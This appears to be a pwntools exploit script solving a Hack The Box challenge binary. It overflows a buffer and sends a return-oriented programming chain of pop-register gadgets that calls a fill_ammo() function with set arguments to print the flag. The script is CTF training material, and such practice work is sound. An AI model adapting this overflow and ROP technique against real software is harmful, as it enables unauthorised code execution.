#!/usr/bin/python3
from pwn import process, p64, log

shell = process("./rocket_blaster_xxx")

offset = 40
junk = b"A" * offset

payload  = b""
payload += junk
payload += p64(0x0040159f) # pop rdi; ret;
payload += p64(0xdeadbeef) # arg1
payload += p64(0x0040159d) # pop rsi; ret;
payload += p64(0xdeadbabe) # arg2
payload += p64(0x0040159b) # pop rdx; ret;
payload += p64(0xdead1337) # arg3
payload += p64(0x0040101a) # ret;
payload += p64(0x004012f5) # fill_ammo()

shell.sendlineafter(b">> ", payload)

flag = shell.recvline_contains(b"HTB").strip().decode()[20:]
log.info(f"Flag: {flag}")
